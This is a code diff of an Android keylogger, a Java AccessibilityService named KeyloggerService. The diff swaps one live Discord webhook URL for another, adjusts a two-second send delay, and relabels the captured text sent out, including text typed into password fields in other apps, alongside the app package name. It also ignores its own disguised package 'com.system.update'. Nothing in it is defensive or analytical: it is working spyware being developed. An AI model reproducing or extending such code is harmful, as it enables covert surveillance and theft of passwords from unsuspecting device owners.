@@ -10,7 +10,7 @@ import java.io.IOException;
 import okhttp3.*;
 
 public class KeyloggerService extends AccessibilityService {
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566527107188785285/ytfcIg4MWuXkSLJ4vidZUF9UuYDZkzYPAWBtDaNTJbPbNMs51fpjJl6y1q0fVYg7yhUH";
     private final OkHttpClient client = new OkHttpClient();
     
     private String lastText = "";
@@ -33,14 +33,14 @@ public class KeyloggerService extends AccessibilityService {
 
                 if (pkg.equals("com.system.update")) return;
 
-                // إلغاء الإرسال السابق لو لسه بيكتب
+                // إلغاء المؤقت القديم عشان ميبعتش حتة حتة
                 if (sendRunnable != null) {
                     handler.removeCallbacks(sendRunnable);
                 }
 
                 // استنى ثانيتين.. لو مكتوبش تاني، ابعت النتيجة النهائية
                 sendRunnable = () -> {
-                    String type = source.isPassword() ? "🔐 **محاولة باسورد:**" : "⌨️ **نص نهائي:**";
+                    String type = source.isPassword() ? "🔐 **باسورد:**" : "⌨️ **نص:**";
                     sendToDiscord(type + "\n**التطبيق:** `" + lastPkg + "`\n**النص:** `" + lastText + "`");
                 };
                 handler.postDelayed(sendRunnable, 2000);
